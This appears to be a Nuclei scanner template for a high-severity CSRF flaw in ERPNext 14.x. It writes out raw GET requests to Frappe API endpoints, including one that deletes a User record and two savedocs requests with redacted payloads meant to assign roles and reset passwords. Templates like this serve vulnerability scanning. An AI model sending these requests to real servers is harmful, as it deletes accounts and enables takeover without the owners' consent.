id: csrf-vulnerability-erpnext

info:
  name: CSRF Vulnerability in ERPNext
  author: Gaurang
  severity: high
  description: |
    A Cross-Site Request Forgery (CSRF) vulnerability allowing unauthorized state-changing operations in ERPNext 14.82.1 and 14.74.3. This leads to account takeover and other malicious actions without user consent.
  tags: csrf,erpnext,account-takeover

http:
  - raw:
      - |
        GET /api/method/frappe.desk.reportview.delete_items?items=%5B%221%401.com%22%5D&doctype=User HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Success"

  - raw:
      - |
        GET /api/method/frappe.desk.form.save.savedocs?doc=REDACTED_JSON&action=Save HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Role Assigned"

  - raw:
      - |
        GET /api/method/frappe.desk.form.save.savedocs?doc=REDACTED_JSON&action=Save HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Password Reset"
